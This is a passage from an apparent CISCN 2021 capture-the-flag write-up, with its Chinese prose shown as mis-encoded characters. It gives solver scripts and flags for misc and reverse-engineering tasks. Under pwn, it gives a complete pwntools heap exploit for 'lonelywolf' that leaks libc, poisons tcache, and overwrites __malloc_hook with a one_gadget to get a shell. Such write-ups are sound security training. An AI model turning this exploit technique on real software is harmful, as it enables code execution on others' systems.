punctuation">(</span>pic_file<span class="token punctuation">)</span>        coors <span class="token operator">=</span> get_rgb<span class="token punctuation">(</span>pic<span class="token punctuation">)</span></code></pre><p>å¾—åˆ°æ‰€æœ‰åƒç´ ç‚¹åç”»å›¾ï¼Œä½¿ç”¨ç°æˆè„šæœ¬</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token punctuation">,</span> ImageDrawflag_image <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'list.txt'</span><span class="token punctuation">)</span>draw <span class="token operator">=</span> ImageDraw<span class="token punctuation">.</span>Draw<span class="token punctuation">(</span>flag_image<span class="token punctuation">)</span><span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    point <span class="token operator">=</span> line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span>    flag_image<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>point<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>point<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>flag_image<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">"./flag.png"</span><span class="token punctuation">)</span></code></pre><p>å¾—åˆ°å¦‚ä¸‹å›¾</p><img src="/article/ciscn2021/image-20210516051514950.png" class="" title="image-20210516051514950" loading="lazy"><p>çº¯æ‰‹åŠ¨ä¸€ç‚¹ä¸€ç‚¹æ…¢æ…¢æ‹¼å‡ºäº†flag</p><img src="/article/ciscn2021/image-20210515184657362.png" class="" title="image-20210515184657362" loading="lazy"><p>Flag:</p><pre class="language-none"><code class="language-none">CISCN&#123;12504d0f-9de1-4b00-87a5-a5fdd0986a00&#125;</code></pre><h3 id="robot"><a href="#robot" class="headerlink" title="robot"></a>robot</h3><p><code>strings cap.pcapng</code>å¯ä»¥çœ‹åˆ°æœ‰åæ ‡è½´ï¼Œåæ ‡è½´ä¸ºä¸‰ç»´åæ ‡ï¼Œä½†ç”±äºzè½´å¤§å¤šæ•°ä¸º0ï¼Œæ‰€ä»¥å¯ä»¥ç”¨äºŒç»´ç”»å›¾ï¼Œ</p><img src="/article/ciscn2021/image-20210517144021953.png" class="" title="image-20210517144021953" loading="lazy"><p>ç›´æ¥ç”¨ä¸Šé¢çš„è„šæœ¬ï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token punctuation">,</span> ImageDrawflag_image <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'zuobiao.txt'</span><span class="token punctuation">)</span>draw <span class="token operator">=</span> ImageDraw<span class="token punctuation">.</span>Draw<span class="token punctuation">(</span>flag_image<span class="token punctuation">)</span><span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    point <span class="token operator">=</span> line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span>    flag_image<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>point<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>point<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>flag_image<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">"./flag.png"</span><span class="token punctuation">)</span></code></pre><p>å¾—åˆ°å›¾ç‰‡ï¼š</p><img src="/article/ciscn2021/image-20210517144052457.png" class="" title="image-20210517144052457" loading="lazy"><p>md5åŠ å¯†ä¹‹åå°±å¾—åˆ°flagï¼šCISCN{d4f1fb80bc11ffd722861367747c0f10}</p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="longlywolf"><a href="#longlywolf" class="headerlink" title="longlywolf"></a>longlywolf</h3><p>expï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> time<span class="token punctuation">,</span> sys<span class="token punctuation">,</span> base64context<span class="token punctuation">.</span>os <span class="token operator">=</span> <span class="token string">'linux'</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./lonelywolf'</span><span class="token punctuation">)</span><span class="token comment">#p = remote('127.0.0.1',12345)</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./lonelywolf'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> binary<span class="token punctuation">.</span>libc<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Size: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x521</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token punctuation">)</span> payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>edit<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">)</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">)</span>addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">0x70</span>malloc_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x4f3d5</span><span class="token punctuation">,</span><span class="token number">0x4f432</span><span class="token punctuation">,</span><span class="token number">0x10a41c</span><span class="token punctuation">]</span>one_gadget <span class="token operator">=</span> libc_base <span class="token operator">+</span> one<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'malloc_hook'</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>  free<span class="token punctuation">(</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="glass"><a href="#glass" class="headerlink" title="glass"></a>glass</h3><pre class="language-python" data-language="python"><code class="language-python">key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xa3</span><span class="token punctuation">,</span><span class="token number">0x1a</span><span class="token punctuation">,</span><span class="token number">0xe3</span><span class="token punctuation">,</span><span class="token number">0x69</span><span class="token punctuation">,</span><span class="token number">0x2f</span><span class="token punctuation">,</span><span class="token number">0xbb</span><span class="token punctuation">,</span><span class="token number">0x1a</span><span class="token punctuation">,</span><span class="token number">0x84</span><span class="token punctuation">,</span><span class="token number">0x65</span><span class="token punctuation">,</span><span class="token number">0xc2</span><span class="token punctuation">,</span><span class="token number">0xad</span><span class="token punctuation">,</span><span class="token number">0xad</span><span class="token punctuation">,</span><span class="token number">0x9e</span><span class="token punctuation">,</span><span class="token number">0x96</span><span class="token punctuation">,</span><span class="token number">0x5</span><span class="token punctuation">,</span><span class="token number">0x2</span><span class="token punctuation">,</span><span class="token number">0x1f</span><span class="token punctuation">,</span><span class="token number">0x8e</span><span class="token punctuation">,</span><span class="token number">0x36</span><span class="token punctuation">,</span><span class="token number">0x4f</span><span class="token punctuation">,</span><span class="token number">0xe1</span><span class="token punctuation">,</span><span class="token number">0xeb</span><span class="token punctuation">,</span><span class="token number">0xaf</span><span class="token punctuation">,</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token number">0xea</span><span class="token punctuation">,</span><span class="token number">0xc4</span><span class="token punctuation">,</span><span class="token number">0xa8</span><span class="token punctuation">,</span><span class="token number">0x2d</span><span class="token punctuation">,</span><span class="token number">0x42</span><span class="token punctuation">,</span><span class="token number">0xc7</span><span class="token punctuation">,</span><span class="token number">0x6e</span><span class="token punctuation">,</span><span class="token number">0x3f</span><span class="token punctuation">,</span><span class="token number">0xb0</span><span class="token punctuation">,</span><span class="token number">0xd3</span><span class="token punctuation">,</span><span class="token number">0xcc</span><span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">,</span><span class="token number">0xf9</span><span class="token punctuation">,</span><span class="token number">0x98</span><span class="token punctuation">,</span><span class="token number">0x3f</span><span class="token punctuation">]</span>num <span class="token operator">=</span> <span class="token string">'12345678'</span>number <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    number<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>a <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    b <span class="token operator">=</span> number<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    a <span class="token operator">=</span> <span class="token punctuation">(</span>a <span class="token operator">+</span> b <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>num<span class="token punctuation">[</span>i<span class="token operator">%</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>    number<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> number<span class="token punctuation">[</span>a<span class="token punctuation">]</span>    number<span class="token punctuation">[</span>a<span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>num<span class="token punctuation">[</span>i<span class="token operator">%</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token punctuation">]</span>    key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span>    key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">^</span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token punctuation">]</span> a <span class="token operator">=</span> <span class="token number">0</span>c <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> <span class="token punctuation">(</span>a<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>    b <span class="token operator">=</span> number<span class="token punctuation">[</span>a<span class="token punctuation">]</span>    c <span class="token operator">=</span> <span class="token punctuation">(</span>c <span class="token operator">+</span> b<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>    number<span class="token punctuation">[</span>a<span class="token punctuation">]</span> <span class="token operator">=</span> number<span class="token punctuation">[</span>c<span class="token punctuation">]</span>    number<span class="token punctuation">[</span>c<span class="token punctuation">]</span> <span class="token operator">=</span> b    key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> number<span class="token punctuation">[</span><span class="token punctuation">(</span>b <span class="token operator">+</span> number<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre><h3 id="babybc"><a href="#babybc" class="headerlink" title="babybc"></a>babybc</h3><p>ç”¨åˆ° LLVMï¼Œå†IDAæ‰“å¼€</p><p>ä¸¤ä¸ªå‡½æ•°ï¼Œå†™äº†å„ç§é™åˆ¶</p><pre class="language-none"><code class="language-none">æ¨ªrow 0001 1000 2001 0000 1010map[0][3] &gt; map[0][4]map[1][0] &gt; map[1][1]map[2][0] &lt; map[2][1]map[2][3] &gt; map[2][4]map[4][0] &gt; map[4][1]map[4][2] &gt; map[4][3]çºµcol 00202 00000 00010 01001map[0][2] &gt; map[1][2]map[0][4] &gt; map[1][4]map[2][3] &lt; map[3][3]map[3][1] &lt; map[4][1]map[3][4] &lt; map[4][3]</code></pre><p>expï¼š</p><pre class="language-python" data-language="python"><code class="language-python">num1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>num2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>num3 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>num4 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>num5 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment">#################################</span><span class="token keyword">for</span> i1 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i2 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i2 <span class="token operator">==</span> i1<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> i3 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>i3 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i3 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i3 <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">continue</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">for</span> i4 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span>i4 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i3  <span class="token keyword">or</span> i4 <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            <span class="token keyword">continue</span>                        <span class="token keyword">else</span><span class="token punctuation">:</span>                            <span class="token keyword">for</span> i5 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                <span class="token keyword">if</span><span class="token punctuation">(</span>i5 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i5 <span class="token operator">==</span>i4 <span class="token keyword">or</span> i4 <span class="token operator">&lt;=</span> i5<span class="token punctuation">)</span><span class="token punctuation">:</span>                                    <span class="token keyword">continue</span>                                <span class="token keyword">else</span><span class="token punctuation">:</span>                                    index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i1<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i2<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i3<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i4<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i5<span class="token punctuation">)</span>                                    num1<span class="token punctuation">.</span>append<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token comment">#################################</span><span class="token keyword">for</span> i1 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i2 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i2 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i2 <span class="token operator">>=</span> i1 <span class="token keyword">or</span> i2 <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> i3 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i3 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i3 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i3 <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">continue</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">for</span> i4 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>i4 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i4 <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            <span class="token keyword">continue</span>                        <span class="token keyword">else</span><span class="token punctuation">:</span>                            <span class="token keyword">for</span> i5 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>i5 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i5 <span class="token operator">==</span>i4<span class="token punctuation">)</span><span class="token punctuation">:</span>                                    <span class="token keyword">continue</span>                                <span class="token keyword">else</span><span class="token punctuation">:</span>                                    index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i1<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i2<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i3<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i4<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i5<span class="token punctuation">)</span>                                    num2<span class="token punctuation">.</span>append<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token comment">#################################</span><span class="token keyword">for</span> i1 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i2 <span class="token 